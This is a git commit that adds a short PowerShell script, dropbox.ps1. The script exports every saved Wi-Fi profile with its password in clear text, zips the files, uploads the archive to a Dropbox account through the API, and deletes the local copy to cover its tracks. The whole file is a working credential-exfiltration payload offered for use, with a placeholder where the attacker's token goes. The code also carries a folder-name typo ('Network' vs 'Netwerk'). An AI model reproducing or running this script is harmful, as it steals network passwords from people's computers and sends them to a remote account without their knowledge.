891d1999636d7c04593c81f23ef929541c8e4376
ARaNdOmScRaPBOT <41909899+ARaNdOmScRaPBOT@users.noreply.github.com>
2019-02-15 16:25:54 +0100

    the powershell file you put in your dropbox

---
+++ dropbox.ps1
@@ -0,0 +1,13 @@
+mkdir $env:Temp\Network
+netsh wlan export profile key=clear folder=$env:Temp\Network
+Compress-Archive -Path $env:Temp\Netwerk\* -CompressionLevel NoCompression -DestinationPath $env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip
+$TargetFilePath="/$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
+$SourceFilePath="$env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + "PUT YOUR DROPBOX API ACCES TOKEN HERE"
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+rm $SourceFilePath
